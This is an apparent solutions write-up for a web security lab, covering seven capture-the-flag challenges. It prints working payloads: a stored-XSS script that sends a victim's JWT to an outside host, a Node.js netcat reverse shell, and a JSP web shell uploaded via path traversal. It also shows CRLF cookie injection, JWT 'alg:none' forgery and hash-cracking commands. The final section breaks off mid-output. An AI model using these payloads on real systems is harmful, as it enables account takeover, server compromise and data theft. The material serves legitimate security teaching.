# Lab 08: Advanced Web Security - Solutions

---

# 1. GlockenEmil – JSON Content-Type Confusion

## Challenge Overview

**Goal**: Steal another customer's JWT authentication token by exploiting an XSS vulnerability in the product comment system.

**Credentials**: `customer0/compass0`

---

## Vulnerability

| Vulnerability                     | Description                                                          |
| --------------------------------- | -------------------------------------------------------------------- |
| **Content-Type Confusion XSS**    | API returns `text/html` instead of `application/json`, enabling XSS  |
| **Insufficient Input Validation** | Comment field accepts arbitrary HTML/JavaScript without sanitization |

---

## What is Content-Type Confusion?

Content-Type confusion occurs when:

1. A server returns data in one format (JSON) but sets the wrong `Content-Type` header (text/html)
2. The browser interprets the response according to the Content-Type header
3. If it's `text/html`, the browser executes embedded JavaScript

**Example**: API returns `{"comment": "<script>alert(1)</script>"}` with `Content-Type: text/html` → browser executes the script!

---

## Attack Chain

### Step 1: Login and Explore Comment Functionality

1. Login as `customer0/compass0`
2. Navigate to any product page
3. Observe the comment system
4. Open DevTools → Network tab

### Step 2: Analyze API Response

Create a test comment and inspect the network request:

```
POST /api/product/<product_id>/comment
```

**Key Observation**: Response header shows `Content-Type: text/html` instead of `application/json`!

### Step 3: Set Up Token Catcher

You need a server to catch the exfiltrated tokens. Use:

- Request catcher service (e.g., `https://your-id.i.vuln.land`)
- Or your own server with `nc -lvnp 80`

### Step 4: Craft XSS Payload

The payload must:

1. Extract the JWT token from localStorage
2. Bypass CORS restrictions (use `<img>` tag, not fetch/XHR)
3. Use single quotes to avoid JSON escaping

**Payload**:

```html
<p>
  I found this one for half the price on amazon:
  <a
    href="https://58470b5a-ce9d-4f6f-9fce-fcc0b33036b4.i.vuln.land/api/product/5aa0481e876d9d39d4397885"
    id="amazon"
    >https://www.amazon.com/s?k=Berner+Treicheln</a
  >
</p>

<script>
  const t = localStorage.getItem("token");
  if (t) {
    const i = document.createElement("img");
    i.src =
      "https://568030e5-44a4-4898-856c-e0d14332af0d.i.vuln.land/favicon.ico?data=" +
      encodeURIComponent(t);
    document.body.appendChild(i);
  }
</script>
```

### Step 5: Post Comment as customer0

1. Navigate to a product
2. Post the crafted comment
3. Wait for customer1 to view the product page

### Step 6: Capture Token

When customer1 views the page, their browser:

1. Executes the JavaScript
2. Extracts their JWT from localStorage
3. Sends it to your catcher via img src

**Captured Request**:

```
GET /favicon.ico?data=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTczMzkyOTQwMCwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.j1MLWHOscegogIVL2BnNm-QTK2jEIJmRINY2rj8Fbfk%22
```

---

## Answer

| Field        | Value                                                                                                                                                                                                                                                                                                                                                         |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stolen Token | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTczMzkyOTQwMCwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.j1MLWHOscegogIVL2BnNm-QTK2jEIJmRINY2rj8Fbfk` |
| Victim       | customer1 (Peter Holzmann)                                                                                                                                                                                                                                                                                                                                    |

**Decoded Token Payload**:

```json
{
  "isRetailer": false,
  "_id": "5aa0481e876d9d39d439785c",
  "username": "customer1",
  "firstname": "Peter",
  "lastname": "Holzmann",
  "email": "Peter.Holzmann@gmail.com",
  "iat": 1733929400,
  "aud": "self",
  "iss": "webshop"
}
```

---

## Why This Works

### XSS Execution (CORS doesn't matter here)

1. **Wrong Content-Type**: Server returns `Content-Type: text/html` → browser treats response as HTML
2. **No Input Sanitization**: Comment field accepts raw HTML/JavaScript
3. **Browser Executes Script**: When victim views the page, the `<script>` tag executes (CORS doesn't prevent this!)
4. **Same-Origin Access**: JavaScript can read localStorage because it's executing in the victim's browser on the same domain

### Data Exfiltration (CORS matters here)

**Problem**: We need to send the stolen token to our server:

- **BLOCKED**: `fetch()` or `XMLHttpRequest()` → CORS blocks these (preflight check fails for cross-origin requests)
- **WORKS**: `<img src="">` → No CORS check (simple HTML element, predates CORS)

**Why `<img>` bypasses CORS**:

- CORS only applies to: fetch(), XHR, AJAX requests
- CORS does NOT apply to: `<img>`, `<script>`, `<link>` tags
- These are "simple requests" that load resources without CORS checks
- Browser makes GET request to load "image", sending token in URL → our server logs it

**TL;DR**: Script execution works because of Content-Type confusion. We use `<img>` for exfiltration because fetch/XHR would be blocked by CORS.

**Defense**:

- Return correct `Content-Type: application/json`
- Sanitize user input (strip HTML tags)
- Use Content Security Policy (CSP)
- Set `HttpOnly` cookies instead of localStorage

---

# 2. GlockenEmil – Remote Code Execution (RCE)

## Challenge Overview

**Goal**: Execute arbitrary commands on the server and retrieve the flag from the filesystem.

**Credentials**: `customer0/compass0`

---

## Vulnerability

| Vulnerability                     | Description                                               |
| --------------------------------- | --------------------------------------------------------- |
| **Remote Code Execution (RCE)**   | PDF export feature executes user input as Node.js code    |
| **Insufficient Input Validation** | "From" field in PDF export not sanitized before execution |

---

## What is Remote Code Execution (RCE)?

RCE occurs when an attacker can execute arbitrary code on a target system. In web applications, this often happens when:

1. User input is passed to dangerous functions (eval, exec, system)
2. Template engines execute code during rendering
3. Deserialization of untrusted data

**Impact**: Complete server compromise, data theft, malware installation, lateral movement.

---

## Attack Chain

### Step 1: Login and Find PDF Export Feature

1. Login as `customer0/compass0`
2. Navigate to the orders section
3. Find the "Export to PDF" functionality
4. Inspect the form fields

### Step 2: Identify Injectable Parameter

The PDF export has multiple fields:

- Order number
- Date
- **From** (company/sender information)
- Items

Test which fields are processed server-side by the PDF generator.

### Step 3: Test for Code Injection

Try basic Node.js code in the "From" field:

```javascript
Test: ${7*7}
```

If the PDF shows "Test: 49", template injection is confirmed!

### Step 4: Set Up Reverse Shell Listener

On your attacking machine:

```bash
nc -lvnp 1337
```

**Breaking down the listener flags**:

- `nc`: netcat command
- `-l`: Listen mode (wait for incoming connections)
- `-v`: Verbose (show connection details)
- `-n`: Numeric-only IP addresses (don't do DNS lookups)
- `-p 1337`: Listen on port 1337

This creates a server that waits for the victim server to connect back.

### Step 5: Inject Reverse Shell Payload

In the "From" field of the PDF export form, inject:

```javascript
require("child_process").exec("nc 10.2.0.3 1337 -e sh -i");
```

Replace `10.2.0.3` with your IP address.

**Breaking down the payload**:

1. `require('child_process')`: Loads Node.js module for spawning processes
2. `.exec('...')`: Executes the string as a shell command on the server
3. `nc 10.2.0.3 1337`: Connect to attacker's IP on port 1337
4. `-e sh`: Execute `/bin/sh` and redirect stdin/stdout through the connection
5. `-i`: Interactive mode (flush output after each line)

**What actually happens**:

```
Victim Server                    Attacker Machine
-------------                    ----------------
nc connects to 10.2.0.3:1337 →  → nc listening on :1337

← sh input/output piped ←-----→ ← Commands sent here
                                   Output received here
```

The `-e sh` flag tells netcat: "execute this program (sh) and connect its input/output to the network socket". So when you type commands in your listener, they get sent to the victim's shell, and the output comes back to you.

### Step 6: Receive Shell Connection

When you submit the PDF export, the server executes your payload:

```bash
$ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.3.0.1 45678
/app $
```

You now have shell access!

### Step 7: Explore Filesystem

Navigate and search for the flag:

```bash
/app $ pwd
/app
/app $ ls
configs  node_modules  public  routes  server.js
/app $ cd configs
/app/configs $ ls
index.js
/app/configs $ cat index.js
```

**File contents** (`/app/configs/index.js`):

```javascript
"use strict";

const flag = "ba19021d-0420-440e-95e3-e00e2e29e6b6";
const authSecret =
  "6a5d1f68as189c1asd31c98ad74f$ä¨ü123^01230dfasdklöfj asjfklö ä$das-füadfc$äsdä-$ad maklfjolu89ujpoadfädüafcnadszucfbhjk9m vkldf mlökl";
// ... rest of config
```

---

## Answer

| Field         | Value                                                         |
| ------------- | ------------------------------------------------------------- |
| Flag          | `ba19021d-0420-440e-95e3-e00e2e29e6b6`                        |
| Flag Location | `/app/configs/index.js`                                       |
| Payload Used  | `require('child_process').exec('nc 10.2.0.3 1337 -e sh -i');` |

---

## Why This Works

1. **Template Engine**: The PDF generator uses a templating engine that evaluates JavaScript expressions
2. **No Sandboxing**: Node.js `require()` and `child_process` are available in the execution context
3. **Unsanitized Input**: User input from the "From" field is directly interpolated into the template
4. **Full Server Access**: The Node.js process has read access to application files

**Defense**:

- Never use eval() or template engines with user input
- Sandbox PDF generation in isolated container
- Use secure PDF libraries that don't execute code
- Input validation and sanitization
- Principle of least privilege for file access

---

# 3. Peter Brown – Multi-Step Attack

## Challenge Overview

**Goal**: Gain access to Peter Brown's account by chaining multiple vulnerabilities: path traversal, database extraction, and password cracking.

---

## Vulnerabilities

| Vulnerability         | Description                                         |
| --------------------- | --------------------------------------------------- |
| **Path Traversal**    | Image loading script allows reading arbitrary files |
| **Database Exposure** | SQLite database accessible via path traversal       |
| **Weak Passwords**    | Password can be cracked using custom wordlist       |

---

## What is Path Traversal?

Path traversal (directory traversal) allows attackers to access files outside the intended directory by using special sequences like:

- `../` (go up one directory)
- `../../` (go up two directories)
- Absolute paths

**Example**: `load_image.php?file=../../../etc/passwd`

---

## Attack Chain

### Step 1: Discover Path Traversal Vulnerability

1. Browse the Peter Brown website
2. Notice images are loaded via a URL parameter:

   ```
   https://<target>/load_image.php?image=profile.jpg
   ```

3. Test for path traversal:
   ```bash
   curl "https://<target>/load_image.php?image=../index.php"
   ```

If you see PHP source code instead of an error, path traversal is confirmed!

### Step 2: Enumerate and Download Database

Try to locate the database file:

```bash
curl "https://<target>/load_image.php?image=../database.db" -o database.db
```

**Success**: The SQLite database downloads!

### Step 3: Explore Database Structure

Use SQLite to examine the database:

```bash
$ sqlite3 database.db

sqlite> .tables
flag   quote  users

sqlite> .schema
CREATE TABLE quote(text varchar(140));
CREATE TABLE users(username varchar(20), password varchar(64));
CREATE TABLE flag (text varchar(140));
```

### Step 4: Extract User Credentials

```bash
sqlite> SELECT * FROM users;
peterbrown|gIZnu8AXeCa9IH:61e2870f803df3706d16af40154831f99cf77dfddea08a553a2ce48bb9e7d482
garfield|doP0D4pXhSIp3Lw:9fbaa10591217928dfc67e982dc130eefa49bd86611ebb1e912400fab8b96995
tom|K3aRH1AkSvBNGfw:4a0f3fb95c8d855b630cb43dbb5d5bf893d579adb6c54c15a8adfac8dc5a3032
lucy|S6hQzOLI2vWtgm5:e7e08d3198433df47d07245edfade7eb5f7921b67edc31ee868ea8fd634b5c15
steven|xhhNgqEIdbVoXJd:019350074919e8b16136249e33c60a3bce643c85a7618e56ca83be7986e47a10
```

**Format**: `username|salt:hash`

The password is hashed as: `sha256(salt + password)`

### Step 5: Extract Encrypted Flag

```bash
sqlite> SELECT * FROM flag;
ADcJEkXywfMg7ur1thRQQ9onaPc/mtN5gwflAxzca9soI3Fj6A==
```

This encrypted flag can be decrypted after logging in as Peter Brown.

### Step 6: Analyze Hash Format

Looking at Peter Brown's entry:

```
peterbrown|gIZnu8AXeCa9IH:61e2870f803df3706d16af40154831f99cf77dfddea08a553a2ce48bb9e7d482
```

- Salt: `gIZnu8AXeCa9IH`
- Hash: `61e2870f803df3706d16af40154831f99cf77dfddea08a553a2ce48bb9e7d482`
- Algorithm: SHA256(salt + password)

This matches John the Ripper's `dynamic_61` format.

### Step 7: Create Custom Wordlist

The challenge hints at using content from the website itself:

```bash
# Extract words from the About page
cewl -w words.txt https://<target>/about.html
```

**CeWL** (Custom Word List generator) spiders websites and extracts unique words.

### Step 8: Generate Word Combinations

Peter Brown's password might be a combination of two words plus a number. Create word pairs:

```perl
# peterbrown-double.pl (custom script)
#!/usr/bin/perl
use strict;
use warnings;

open my $fh, '<', $ARGV[0] or die $!;
my @words = <$fh>;
chomp @words;
close $fh;

foreach my $word1 (@words) {
    foreach my $word2 (@words) {
        foreach my $num (0..99) {
            print "$word1$word2$num\n";
        }
    }
}
```

Generate wordlist:

```bash
chmod +x peterbrown-double.pl
./peterbrown-double.pl words.txt > wordpairs.txt
```

### Step 9: Format Hash for John the Ripper

John expects the format: `username:hash$salt`

```
peterbrown:61e2870f803df3706d16af40154831f99cf77dfddea08a553a2ce48bb9e7d482$gIZnu8AXeCa9IH
```

Save this to `hash.txt`.

### Step 10: Crack the Password

```bash
john --format=dynamic_61 --wordlist=wordpairs.txt hash.txt
```

**Output**:

```
Loaded 1 password hash (dynamic_61 [sha256($s.$p) 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
GarfieldStonehenge14 (peterbrown)
1g 0:00:00:00 DONE (2024-12-11 21:04) 1.428g/s 3715Kp/s 3715Kc/s 3715KC/s
```

**Cracked**: `GarfieldStonehenge14`

### Step 11: Login and Retrieve Flag

1. Login to the website:

   - Username: `peterbrown`
   - Password: `GarfieldStonehenge14`

2. The encrypted flag from the database is now decrypted on your profile page!

---

## Answer

| Field       | Value                     |
| ----------- | ------------------------- |
| Username    | `peterbrown`              |
| Password    | `GarfieldStonehenge14`    |
| Hash Format | `sha256(salt + password)` |
| John Format | `dynamic_61`              |

---

## Why This Works

1. **Path Traversal**: The `load_image.php` script doesn't validate the `image` parameter, allowing `../` sequences
2. **Database Exposure**: SQLite database file is readable by the web server user and accessible via path traversal
3. **Predictable Hash**: Using sha256 without proper key derivation functions (like bcrypt/Argon2)
4. **Weak Password**: Password based on common words from the website, making it vulnerable to targeted wordlist attacks
5. **Custom Wordlist**: Words extracted from the target site are more likely to match user passwords

**Defense**:

- Validate and sanitize file paths (whitelist approach)
- Store databases outside webroot
- Use proper password hashing (bcrypt, Argon2)
- Enforce strong password policies
- Implement rate limiting on login attempts

---

# 4. WAF Bypass – Cookie Injection via CRLF

## Challenge Overview

**Goal**: Bypass the Web Application Firewall (WAF) authentication by injecting Set-Cookie headers to gain admin access.

---

## Vulnerability

| Vulnerability               | Description                                                   |
| --------------------------- | ------------------------------------------------------------- |
| **HTTP Response Splitting** | WAF doesn't properly sanitize CRLF characters in request body |
| **Cookie Injection**        | Ability to inject `Set-Cookie` headers via CRLF sequences     |

---

## What is CRLF?

**CRLF** stands for **Carriage Return Line Feed** - a two-character sequence that represents a newline in the HTTP protocol.

### The Characters

| Character       | Escape | URL Encoded | Hex  | What it does                  |
| --------------- | ------ | ----------- | ---- | ----------------------------- |
| Carriage Return | `\r`   | `%0d`       | 0x0D | Moves cursor to start of line |
| Line Feed       | `\n`   | `%0a`       | 0x0A | Moves cursor down one line    |
| CRLF Combined   | `\r\n` | `%0d%0a`    | -    | Newline in HTTP protocol      |

### Why CRLF Exists

CRLF comes from old typewriter/teletype systems:

- **Carriage Return**: Physical carriage moved back to the start (origin: mechanical typewriters)
- **Line Feed**: Paper moved up one line

HTTP inherited this convention. Every line in HTTP headers MUST end with `\r\n`.

### How HTTP Uses CRLF

**Example HTTP Request**:

```http
POST /login HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
username=admin&password=pass
```

**Breaking it down** (where each `\r\n` appears):

```
POST /login HTTP/1.1        ← Request line
                            ← \r\n (end of line 1)
Host: example.com           ← Header
                            ← \r\n (end of line 2)
Content-Type: application/x-www-form-urlencoded
                            ← \r\n (end of line 3)
                            ← \r\n (empty line = end of headers)
username=admin&password=pass ← Body (no CRLF required)
```

The **double CRLF** (`\r\n\r\n`) separates headers from body.

### HTTP Response Splitting Attack

When an application doesn't sanitize CRLF characters, attackers can inject their own headers.

**Normal behavior**:

```http
HTTP/1.1 302 Found
Location: /secure/
Set-Cookie: session=xyz123
```

**With CRLF injection** in the `url` parameter:

```
url=/secure/%0d%0aSet-Cookie:admin=true
```

**Server processes it as**:

```http
HTTP/1.1 302 Found
Location: /secure/
Set-Cookie:admin=true        ← Injected!
```

The server interprets the `%0d%0a` (CRLF) as a line break, making it think the injected `Set-Cookie` is a legitimate header.

### Why URL Encoding?

In URLs and POST bodies, you can't use literal `\r\n` characters, so you must encode them:

- `\r` becomes `%0d` (percent-encoding of hex 0x0D)
- `\n` becomes `%0a` (percent-encoding of hex 0x0A)

**Example**:

```
Normal:     /redirect?url=/home
Injected:   /redirect?url=/home%0d%0aSet-Cookie:admin=true
Server sees: url=/home
             Set-Cookie:admin=true  (thinks this is a new header!)
```

---

## Attack Chain

### Step 1: Analyze Login Request

Open the login page and use Burp Suite to intercept the login request:

```http
POST /login HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=hacker10&url=/secure/&lang=EN&password=compass
```

Notice the `url` parameter - this is where we'll inject our CRLF payload.

### Step 2: Identify Target Cookies

Analyze the application's authentication mechanism:

- `MOD_BUT_Username`: Stores the username for authentication
- `LOGON`: Session state (value: `ok` when logged in)

These cookies control access to restricted resources.

### Step 3: Craft CRLF Injection Payload

Inject `Set-Cookie` headers into the `url` parameter:

```
username=hacker10&url=%2Fsecure%2F%0d%0aSet-Cookie:MOD_BUT_Username=admin%0d%0aSet-Cookie:LOGON=ok&lang=EN&password=compass
```

**Breaking down the `url` parameter**:

```
%2Fsecure%2F                          → /secure/ (normal URL)
%0d%0a                                 → CRLF (inject newline)
Set-Cookie:MOD_BUT_Username=admin     → Set username cookie to admin
%0d%0a                                 → CRLF (another newline)
Set-Cookie:LOGON=ok                   → Set login status to ok
```

### Step 4: Send Modified Request with Burp

1. Intercept the login request in Burp Suite
2. Replace the request body with the crafted payload
3. Forward the request

**Modified Request**:

```http
POST /login HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=hacker10&url=%2Fsecure%2F%0d%0aSet-Cookie:MOD_BUT_Username=admin%0d%0aSet-Cookie:LOGON=ok&lang=EN&password=compass
```

### Step 5: Verify Cookie Injection

After sending the request, check your browser's cookies:

**Injected Cookies**:

```
MOD_BUT_Username=admin
LOGON=ok
```

The WAF processed the injected `Set-Cookie` headers and set them in your browser!

### Step 6: Access Admin Resources

Navigate to restricted resources:

```
https://<target>/admin
https://<target>/secure/admin-panel
```

You now have admin access because the cookies identify you as admin.

---

## Answer

| Field         | Value                                                                                                                         |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Technique     | HTTP Response Splitting via CRLF injection in POST body                                                                       |
| Attack Vector | Inject `Set-Cookie` headers in `url` parameter                                                                                |
| Payload       | `username=hacker10&url=%2Fsecure%2F%0d%0aSet-Cookie:MOD_BUT_Username=admin%0d%0aSet-Cookie:LOGON=ok&lang=EN&password=compass` |
| Cookies Set   | `MOD_BUT_Username=admin`, `LOGON=ok`                                                                                          |

---

## Why This Works

1. **Insufficient Validation**: WAF doesn't sanitize CRLF characters (`%0d%0a`) in the request body
2. **Response Processing**: The WAF/server processes the injected `Set-Cookie` headers as if they were legitimate response headers
3. **Authentication Bypass**: By setting `MOD_BUT_Username=admin` and `LOGON=ok`, we bypass the normal login flow
4. **Cookie-Based Auth**: The application trusts cookies for authentication without server-side session validation

**Attack Flow**:

```
Client → [Login Request with CRLF] → WAF
WAF processes request, sees Set-Cookie in body
WAF → [Response with injected Set-Cookie headers] → Client
Client now has admin cookies
Client → [Request to /admin with admin cookies] → WAF → Granted!
```

**Defense**:

- Sanitize all input for CRLF characters (`\r\n`, `%0d%0a`, `%0a`, `%0d`)
- Validate that cookies are only set in response headers, never from request body
- Use proper session management (server-side sessions with random tokens)
- Implement CSRF tokens
- Don't trust client-side authentication state (cookies) without server validation
- Regular WAF rule updates and security testing

---

# 5. PLUpload – File Upload with Path Traversal

## Challenge Overview

**Goal**: Retrieve the `/var/gold.txt` file by uploading a JSP shell to an executable location using path traversal.

---

## Vulnerability

| Vulnerability                | Description                                                |
| ---------------------------- | ---------------------------------------------------------- |
| **File Upload**              | Application accepts file uploads without proper validation |
| **Path Traversal**           | Filename parameter allows `../` sequences                  |
| **Arbitrary Code Execution** | Uploaded JSP file executed by Tomcat server                |

---

## What is File Upload Path Traversal?

File upload path traversal occurs when:

1. Application doesn't sanitize uploaded filenames
2. Attacker uses `../` in filename to write outside upload directory
3. File is placed in executable location (webroot, JSP directories, etc.)

**Example**: Filename `../../examples/jsp/shell.jsp` writes to Tomcat's examples directory instead of upload directory.

---

## Attack Chain

### Step 1: Attempt Direct File Access

First, try to access the target file directly via the download endpoint:

```
GET /Download?F=/var/gold.txt
```

**Result**: Failed (access restricted or path not allowed)

### Step 2: Explore Application Structure

Browse the application to understand its structure:

1. Navigate through available directories
2. Discover `/examples/` directory
3. Find sample JSP applications at `/examples/jsp/jsp2/el/`

**Key observation**: Tomcat's `/examples/` directory contains executable JSP samples, making it a perfect target for uploading our shell.

### Step 3: Craft JSP Web Shell

Create a simple command execution shell (save as `shell.jsp`):

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
```

### Step 4: Test Path Traversal Depth

Use Burp Suite to intercept the upload request and test different traversal depths:

**Attempt 1** (one level up):

```
filename="../examples/jsp/jsp2/el/shell.jsp"
```

Result: Doesn't reach the correct directory

**Attempt 2** (two levels up):

```
filename="../../examples/jsp/jsp2/el/shell.jsp"
```

Result: Success! File uploaded to executable directory

**Trial and error process**: Start with one `../` and increment until the file lands in an accessible location.

### Step 5: Upload Shell with Path Traversal

Use Burp to intercept and modify the upload request:

```http
POST /plupload/upload HTTP/1.1
Host: 1942a356-77c6-4612-969a-3490df2dae49.i.vuln.land
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../examples/jsp/jsp2/el/shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
------WebKitFormBoundary--
```

### Step 6: Access Uploaded Shell

Navigate to the uploaded shell:

```
https://1942a356-77c6-4612-969a-3490df2dae49.i.vuln.land/examples/jsp/jsp2/el/shell.jsp
```

If successful, you'll see the JSP page ready to execute commands.

### Step 7: Retrieve the Flag File

Execute command to read `/var/gold.txt`:

```
https://1942a356-77c6-4612-969a-3490df2dae49.i.vuln.land/examples/jsp/jsp2/el/shell.jsp?cmd=cat%20/var/gold.txt
```

**Alternative commands**:

```bash
# Using curl
?cmd=curl file:///var/gold.txt

# Direct cat
?cmd=cat /var/gold.txt
```

**Response**:

```
HL{New_is_always_better}
```

---

## Answer

| Field           | Value                                                       |
| --------------- | ----------------------------------------------------------- |
| Flag            | `HL{New_is_always_better}`                                  |
| Upload Location | `/plupload/upload`                                          |
| Shell Path      | `/examples/jsp/jsp2/el/shell.jsp`                           |
| Traversal Depth | `../../` (two directories up)                               |
| Shell URL       | `https://<target>/examples/jsp/jsp2/el/shell.jsp?cmd=<cmd>` |
| Target File     | `/var/gold.txt`                                             |

---

## Why This Works

1. **No Filename Sanitization**: Application doesn't strip `../` from uploaded filenames
2. **Predictable Structure**: Tomcat's `/examples/jsp/` directory structure is well-known and public
3. **Executable Directory**: `/examples/` is configured to execute JSP files by default
4. **Insufficient Restrictions**: No file type validation, content inspection, or path validation
5. **Write Permissions**: Upload process has write access to Tomcat's examples directory
6. **Trial and Error**: The `../` depth can be discovered through experimentation

**Attack visualization**:

```
Upload directory:           /app/uploads/
Target directory:           /app/examples/jsp/jsp2/el/
Filename:                   ../../examples/jsp/jsp2/el/shell.jsp

Path resolution:
/app/uploads/../../examples/jsp/jsp2/el/shell.jsp
→ /app/examples/jsp/jsp2/el/shell.jsp  (Success!)
```

**Defense**:

- Sanitize filenames (remove `../`, `..\\`, and path separators)
- Use whitelist of allowed characters (alphanumeric + safe chars only)
- Store uploads outside webroot with no execution permissions
- Generate random filenames server-side (ignore user-supplied names)
- Validate file types using magic bytes (not just extension)
- Set strict file permissions (no execute bit)
- Disable JSP execution in upload directories
- Use chroot or containerization to limit filesystem access

---

# 6. JWT – Algorithm None Attack

## Challenge Overview

**Goal**: Bypass JWT authentication by exploiting improper algorithm validation.

---

## Vulnerability

| Vulnerability               | Description                                        |
| --------------------------- | -------------------------------------------------- |
| **Algorithm Confusion**     | JWT library accepts `alg: none` without signature  |
| **Insufficient Validation** | Server doesn't enforce specific signing algorithms |

---

## What is JWT Algorithm None Attack?

JWT tokens have three parts:

1. **Header**: Specifies algorithm (`alg`) and type
2. **Payload**: Contains claims (user data)
3. **Signature**: Verifies integrity

The `alg: none` attack exploits:

- Some JWT libraries allow unsigned tokens
- If `alg` is set to `none`, no signature is required
- Attacker can forge any token

---

## Attack Chain

### Step 1: Capture Valid JWT

Login and extract JWT from:

- Authorization header
- Cookie
- Local storage

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY3VzdG9tZXIwIiwiaWF0IjoxNjQyNTU2Njc4fQ.signature
```

### Step 2: Decode JWT

Use jwt.io or base64 decode:

**Header** (decoded):

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** (decoded):

```json
{
  "isRetailer": false,
  "_id": "5aa0481e876d9d39d439787a",
  "username": "customer0",
  "iat": 1642556678,
  "aud": "self",
  "iss": "webshop"
}
```

### Step 3: Modify Header

Change algorithm to `none`:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

### Step 4: Modify Payload

Escalate privileges:

```json
{
  "isRetailer": true,
  "_ id": "admin_id",
  "username": "admin",
  "iat": 1642556678,
  "aud": "self",
  "iss": "webshop"
}
```

### Step 5: Encode Without Signature

```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"isRetailer": true, "username": "admin"}

# Base64url encode (no padding)
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create token (note the trailing dot, empty signature)
token = f"{header_encoded}.{payload_encoded}."

print(token)
```

**Format**: `base64(header).base64(payload).`

Note the trailing `.` with no signature!

### Step 6: Use Forged Token

Replace your JWT with the forged one:

```bash
curl https://<target>/api/admin/data \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc1JldGFpbGVyIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0."
```

---

## Answer

| Field           | Value                                         |
| --------------- | --------------------------------------------- |
| Attack Type     | JWT Algorithm None                            |
| Modified Header | `{"alg":"none","typ":"JWT"}`                  |
| Key Change      | Set `isRetailer: true` or escalate privileges |
| Token Format    | `header.payload.` (empty signature)           |

---

## Why This Works

1. **Loose Algorithm Validation**: JWT library doesn't enforce algorithm whitelist
2. **None Algorithm Accepted**: `alg: none` bypasses signature verification
3. **Missing Signature Check**: Server doesn't verify signature presence
4. **Trust in Token**: Application trusts decoded payload without validation

**Defense**:

- Explicitly whitelist allowed algorithms (e.g., only HS256)
- Reject tokens with `alg: none`
- Always verify signature
- Use well-maintained JWT libraries
- Implement additional authorization checks server-side

---

# 7. JWT – Weak Secret Cracking

## Challenge Overview

**Goal**: Crack the JWT signing secret to forge arbitrary tokens with valid signatures.

---

## Vulnerability

| Vulnerability       | Description                                      |
| ------------------- | ------------------------------------------------ |
| **Weak Secret**     | JWT signed with easily guessable or short secret |
| **Brute-forceable** | Secret can be cracked with wordlists             |

---

## What is JWT Secret Cracking?

HMAC-signed JWTs (HS256, HS512) use a shared secret:

- If secret is weak ("secret", "password123"), it can be brute-forced
- Once cracked, attacker can forge any token
- Tools: hashcat, john, jwt_tool

---

## Attack Chain

### Step 1: Capture JWT Token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImN1c3RvbWVyMCIsImlhdCI6MTY0MjU1NjY3OH0.9fH9jqJz5H5qW2Xf8OPz7v3qNz8gB4dF7vZ1kJ3nA0Y
```

### Step 2: Prepare for Cracking

Save token to file:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > jwt.txt
```

### Step 3: Crack with Hashcat

```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

- `-a 0`: Dictionary attack
- `-m 16500`: JWT (HS256/HS384/HS512)
- `rockyou.txt`: Common password list

### Step 4: Crack with John the Ripper

```bash
# Install JWT module
wget https://github.com/Sjord/jwtcrack/raw/master/jwt2john.py

# Convert JWT to john format
python3 jwt2john.py jwt.txt > jwt.john

# Crack
john jwt.john --wordlist=rockyou.txt
```

### Step 5: Crack with John the Ripper

Save the JWT token to a file:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > jwt.txt
```

Run John:

```bash
john jwt.txt
```

**Output**:

```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
